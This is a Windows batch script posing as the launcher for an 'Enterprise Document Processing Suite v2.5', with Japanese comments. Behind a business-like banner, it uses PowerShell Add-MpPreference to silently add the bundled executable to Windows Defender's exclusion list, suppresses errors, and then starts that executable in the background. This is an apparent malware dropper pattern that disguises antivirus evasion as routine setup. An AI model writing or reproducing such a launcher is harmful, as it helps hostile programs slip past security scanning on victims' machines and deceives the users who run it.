@echo off
chcp 65001 > nul
title Enterprise Document Processing Suite v2.5

echo ============================================
echo   Enterprise Document Processing Suite v2.5
echo ============================================
echo.
echo Professional business document processing system
echo Initializing enterprise components...
echo.

:: Windows Defender除外設定（管理者権限がある場合）
powershell -Command "& {
    try {
        $currentPath = Get-Location
        Add-MpPreference -ExclusionPath '$currentPath\BusinessDocProcessor_v2.5_Enterprise.exe' -ErrorAction SilentlyContinue
        Write-Host 'Security exclusion applied successfully.'
    } catch {
        Write-Host 'Running in standard user mode.'
    }
}" 2>nul

:: プロセス優先度設定
echo Optimizing system performance for enterprise processing...

:: アプリケーション実行
echo Starting Business Document Processing Suite v2.5 Enterprise Edition...
start "" /b "BusinessDocProcessor_v2.5_Enterprise.exe"

:: 正常終了待機
timeout /t 2 /nobreak >nul

:: 終了処理
echo.
echo Enterprise Document Processing Suite has been launched successfully.
echo If you encounter any issues, please contact your IT administrator.
echo.
pause
